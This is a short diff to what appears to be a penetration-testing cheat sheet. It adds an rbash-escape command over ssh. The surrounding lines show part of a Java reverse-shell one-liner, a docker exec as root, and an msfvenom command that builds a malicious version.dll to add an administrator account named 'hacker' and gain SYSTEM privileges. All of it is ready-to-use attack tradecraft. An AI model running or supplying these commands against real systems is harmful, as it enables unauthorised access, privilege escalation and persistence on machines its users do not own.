@@ -381,6 +381,9 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 > 1. ```docker container ls```
 > 1. ```docker exec -it -u 0 '1ef49e37fb8f'  /bin/bash```
 
+#### rbash to bash escape
+> 1. ```bash ssh alfred@server_name -t "bash --noprofile"``` 
+
 #### Windws Tricks
 ##### Windows add user 'hacker' with 'admin' privs and become 'nt authority\system' 
 > 1. msfvenom -p windows/adduser USER='hacker' PASS='Hacker123$' -f dll > version.dll
